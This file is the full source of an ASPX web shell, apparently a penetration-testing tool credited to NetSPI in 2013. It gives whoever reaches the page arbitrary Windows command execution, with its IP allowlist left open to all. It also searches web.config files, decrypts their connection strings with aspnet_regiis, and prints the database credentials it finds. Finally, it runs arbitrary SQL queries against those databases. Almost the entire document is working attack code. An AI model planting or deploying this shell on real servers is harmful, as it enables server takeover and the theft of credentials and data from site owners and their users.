<!-- Web shell - command execution, web.config parsing, and SQL query execution -->

<!-- Command execution - Run arbitrary Windows commands -->
<!-- Web.Config Parser - Extract db connection strings from web.configs (based on chosen root dir) -->
<!-- SQL Query Execution - Execute arbitrary SQL queries (MSSQL only) based on extracted connection strings -->

<!-- Antti - NetSPI - 2013 -->
<!-- Thanks to Scott (nullbind) for help and fancy stylesheets -->
<!-- Based on old cmd.aspx from fuzzdb - http://code.google.com/p/fuzzdb/ -->

<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      

Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
  Dim ipAddress As String = Request.UserHostAddress

  If String.IsNullOrEmpty(ipAddress) Then
    Call DenyAccess()
  Else
    Dim strAllowedIPs As String = "*"

    strAllowedIPs = Replace(Trim(strAllowedIPs), " ", "")
    Dim arrAllowedIPs = Split(strAllowedIPs, ",")
    Dim match As Integer = Array.IndexOf(arrAllowedIPs, ipAddress)

    If strAllowedIPs <> "*" And match < 0 Then
      Call DenyAccess()
    End If
  End If
End Sub


Protected Sub DenyAccess()
  Response.Clear
  Response.StatusCode = 403
  Response.End
End Sub


Protected Sub RunCmd(sender As Object, e As System.Web.UI.WebControls.CommandEventArgs)
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  Dim titletext As String
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo
  
  if (e.CommandArgument="cmd") then
    myProcessStartInfo.Arguments=xcmd.text 
    titletext = "Command Execution"	
  else if (e.CommandArgument="webconf") then
    myProcessStartInfo.Arguments=" /c powershell -C ""$ErrorActionPreference = 'SilentlyContinue';" 
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$path='" + webpath.text + "'; write-host ""Searching for web.configs in $path ...`n"";"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Foreach ($file in (get-childitem $path -Filter web.config -Recurse)) { Try { $xml = [xml](get-content $file.FullName); } Catch { continue; } "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Try { $connstrings = $xml.get_DocumentElement(); } Catch { continue; } "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.ciphervalue -ne $null) "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "{ $tempdir = (Get-Date).Ticks; new-item $env:temp\$tempdir -ItemType directory | out-null; copy-item $file.FullName $env:temp\$tempdir;"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$aspnet_regiis = (get-childitem $env:windir\microsoft.net\ -Filter aspnet_regiis.exe -recurse | select-object -last 1).FullName + ' -pdf ""connectionStrings"" ' + $env:temp + '\' + $tempdir;"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-content $env:temp\$tempdir\$file); } Catch { continue; }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Try { $connstrings = $xml.get_DocumentElement(); } Catch { continue; }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "remove-item $env:temp\$tempdir -recurse;} "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.connectionString -ne $NULL) { write-host ""$file.Fullname --- $_.connectionString""} } }"""
	titletext = "Connection String Parser"	
  else if (e.CommandArgument="sqlquery") then
    myProcessStartInfo.Arguments=" /c powershell -C ""$conn=new-object System.Data.SqlClient.SQLConnection(""""""" + conn.text + """"""");"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Try { $conn.Open(); }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Catch { continue; }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$cmd = new-object System.Data.SqlClient.SqlCommand("""""""+query.text+""""""",$conn);"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$ds=New-Object system.Data.DataSet;"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd);"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "[void]$da.fill($ds);"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$ds.Tables[0];"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$conn.Close();"""
	titletext = "SQL Query Result"	
  end if  
  myProcess.Start()            

  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")
  history.text = result.text + history.text
  result.text= vbcrlf & "<p><h2>" & titletext & "</h2><pre>" & mystring & "</pre>" 
End Sub

</script>

<html>
<head>
<style>
<style>
 body {
  background-image: url("images/repeat.jpg");
  background-repeat: repeat;
 }
 
.para1 {
	margin-left:30px;
	vertical-align:top;
}
.para2 {
	margin-left:30px;	
}
.para3 {
	margin-left:20px;
	margin-top:30px;
	vertical-align:top;
	background-image:url('images/post_middle.jpg');
}

.norep {
	background-image:url('images/repeat2.jpg');
	background-repeat:y-repeat;
	
}

.menu{
margin-right:56px;
margin-bottom:40px;
vertical-align: top;
font-weight: bold;
font-family: Verdana, Arial, Helvetica, sans-serif;
font-size: 12px;
}

.tbl_main_bdr {
	border: medium solid #333333;
}

.tbl_inside_bdr {
	border: thin solid #666666;
}
.style3 {
	margin-left: 20px;
	vertical-align: top;
	font-weight: bold;
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 18px;
}

.post{
background-repeat:no-repeat;
background-image:url('images/post_top.jpg');
}

.style12 {color: #00CC00}

a:link{
text-decoration:none;
COLOR: #000000;
}

a:hover{

text-decoration:underline;
}

.htext{
margin-right:20px;
}


.style17 {font-size: 9px}
.style20 {font-family: Arial, Helvetica, sans-serif}
.style21 {font-size: 24px}
.style22 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 24px;
	font-weight: bold;
}
</style>
</head>
<body>   

<form runat="server"> 
	
	<table border="0" cellspacing="4" cellpadding="4">
		<tr>
			<td valign="middle" width ="100" bgcolor="#990000" align="center">
				<strong><span class="style21"><span class="style20">STEP 1</span></span></strong></a><Br>
			</td>	
			<td valign="middle" width ="150"  bgcolor="#A0A0A0" align="center">
				<strong>ENTER OS COMMANDS</strong></a><Br>
			</td>			
            <td valign="top" width="350" bgcolor="#CCCCCC" align="left">				
				<asp:Label id="L_p" runat="server">Application:</asp:Label><br>
				<asp:TextBox id="xpath" width="350" runat="server">c:\windows\system32\cmd.exe</asp:TextBox><br><br>
				<asp:Label id="L_a" runat="server">Arguments:</asp:Label><br>        
				<asp:TextBox id="xcmd" width="350" runat="server" Text="/c net user">/c net user</asp:TextBox><br>
			</td>  
			<td valign="middle"  bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
				<strong><span class="style21"><span class="style20">RUN</span></span></strong><Br>
				<asp:Button id="Button" OnCommand="RunCmd" CommandArgument="cmd" runat="server" Width="100px" Text="RUN"></asp:Button>
			</td>
        </tr>                     
		<tr>
			<td valign="middle" width ="100" bgcolor="#6699CC" align="center">
				<strong><span class="style21"><span class="style20">STEP 2</span></span></strong></a><Br>
			</td>	
			<td valign="middle" width ="150" bgcolor="#A0A0A0" align="center">
				<strong>PARSE WEB.CONFIGS FOR CONNECTION STRINGS</strong></a><Br>
			</td>			
            <td valign="top" width="350" bgcolor="#CCCCCC" align="left">
				Path to web directories:<br>
				<asp:TextBox id="webpath" width="350" runat="server" Text="c:\inetpub">C:\inetpub</asp:TextBox>		
			</td>  
			<td valign="middle" bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
				<strong><span class="style21"><span class="style20">RUN</span></span></strong><Br>
				<asp:Button id="WebConfig" OnCommand="RunCmd" CommandArgument="webconf" runat="server" Width="100px" Text="RUN"></asp:Button>
			</td>
        </tr>                     
		<tr>
			<td valign="middle" width ="100" bgcolor="#CCCCCC" align="center">
				<strong><span class="style21"><span class="style20">STEP 3</span></span></strong></a><Br>
			</td>	
			<td valign="middle" width ="150" bgcolor="#A0A0A0" align="center" >
				<strong>EXECUTE SQL QUERIES</strong></a><Br>
			</td>
			<td valign="top" bgcolor="#CCCCCC" align="left">
				Connection Strings:<br> 
				<asp:TextBox id="conn" runat="server" Text="Data Source=localhost\sqlexpress2k8;User ID=netspi;PWD=ipsten" width="350">Data Source=localhost\sqlexpress2k8;User ID=netspi;PWD=ipsten</asp:TextBox><br><br>
				SQL query:<br> 
				<asp:TextBox id="query" runat="server" Text="select @@version;" width="350">select @@version;</asp:TextBox> 			
			</td>
			<td valign="middle" bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
				<strong><span class="style21"><span class="style20">RUN</span></span></strong><Br>
				<asp:Button id="SqlQuery" OnCommand="RunCmd" CommandArgument="sqlquery" runat="server" Width="100px" Text="RUN"></asp:Button>
			</td>
        </tr>                     
    </table>	
</form>
	
<table border="0" cellspacing="4" cellpadding="4">
	<tr>
		<td valign="top" width ="735" bgcolor="#CCCCCC" align="left">
			<asp:Label id="result" runat="server"></asp:Label>
			<font color="555555"><asp:Label id="history" runat="server"></asp:Label></font>
		</td>
	</tr>
</table>
</body>
</html>
